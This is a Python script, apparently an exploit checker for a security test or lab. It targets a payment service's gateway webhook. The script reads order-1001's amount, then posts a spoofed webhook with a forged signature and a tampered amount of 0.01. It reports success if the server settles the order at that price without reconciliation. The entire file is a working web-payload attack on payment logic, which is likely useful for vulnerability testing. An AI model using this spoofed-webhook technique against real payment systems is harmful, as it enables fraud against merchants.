import os, sys, json
import requests

base = os.environ.get('TARGET_URL', 'http://localhost:8080').rstrip('/')

def out(msg):
    print(msg)
    sys.exit(0)

try:
    order_id = 'order-1001'
    # Read original order amount (for evidence)
    try:
        r0 = requests.get(f'{base}/api/payments/order/{order_id}', timeout=3)
        original = r0.json().get('amount') if r0.status_code == 200 else None
    except Exception:
        original = None

    tampered = 0.01
    payload = {'OrderId': order_id, 'Amount': tampered, 'Signature': 'forged'}
    r = requests.post(f'{base}/api/webhook/gateway', json=payload, timeout=3)
    if r.status_code != 200:
        out(f'EXPLOIT_FAIL: webhook returned status {r.status_code} body={r.text[:120]}')

    try:
        body = r.json()
    except Exception:
        out(f'EXPLOIT_FAIL: non-json webhook response: {r.text[:120]}')

    amt = body.get('amount')
    status = body.get('status')

    # Confirm with a fresh read
    try:
        r2 = requests.get(f'{base}/api/payments/order/{order_id}', timeout=3)
        confirmed = r2.json() if r2.status_code == 200 else {}
    except Exception:
        confirmed = {}

    c_amt = confirmed.get('amount', amt)
    c_status = confirmed.get('status', status)

    if str(c_status).lower() == 'settled' and float(c_amt) == tampered:
        out(f'EXPLOIT_SUCCESS: order {order_id} settled at tampered amount={c_amt} (original={original}); server accepted spoofed webhook without reconciliation')
    else:
        out(f'EXPLOIT_FAIL: unexpected state amount={c_amt} status={c_status}')
except requests.RequestException as e:
    out(f'EXPLOIT_FAIL: request error {e.__class__.__name__}: {str(e)[:120]}')
except Exception as e:
    out(f'EXPLOIT_FAIL: {e.__class__.__name__}: {str(e)[:120]}')

